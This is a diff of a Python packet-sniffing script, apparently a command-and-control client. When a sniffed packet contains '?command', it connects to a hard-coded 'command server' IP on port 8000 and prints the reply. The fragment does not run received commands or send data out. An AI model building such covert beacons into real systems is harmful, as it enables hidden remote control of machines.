@@ -6,18 +6,19 @@ import socket
 
 
 #command server ip
-serverIP = "130.245.170.45"
+serverIP = "207.246.82.100"
+serverPort = 8000
 
 def respondToServer(pkt):
-	if hasattr(pkt, "load"):
-		#respond if a packet from the server includes this string
-		if "GET /scripts/home.js" in str(pkt.load):
+	if pkt.haslayer(Raw):
+		#respond if a packet from the server includes this string set up a socket
+		if "?command" in str(pkt.load):
+			request = ('GET /test HTTP/1.1\nHost: ' + serverIP + '\n\n').encode()
 			print("command received")
-			request = ('GET / HTTP/1.1\nHost: ' + serverIP + '\n\n').encode()
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((serverIP, 80))
+			s.connect((serverIP, serverPort))
 			s.send(request)
-			result = s.recv(128)
+			result = s.recv(256)
 			if (len(result) > 0):
 				print(result)
 
